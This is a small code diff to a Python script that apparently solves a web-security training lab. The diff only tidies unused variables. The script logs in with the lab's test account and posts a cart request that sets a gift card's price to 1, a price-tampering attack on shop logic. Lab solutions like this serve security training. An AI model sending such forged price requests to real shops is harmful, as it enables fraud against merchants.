@@ -5,10 +5,10 @@ from requests import Request
 
 
 def solve_lab(session):
-    resp = session.login("wiener", "peter")
+    session.login("wiener", "peter")
 
     data = {"productId": "2", "quantity": "1", "price": "1", "redir": "PRODUCT"}
-    resp = session.post_path("/cart", data=data)
+    session.post_path("/cart", data=data)
     logger.info('Added a "Gift Card" to cart')
 
     csrf = session.get_csrf_token("/cart", n=2)
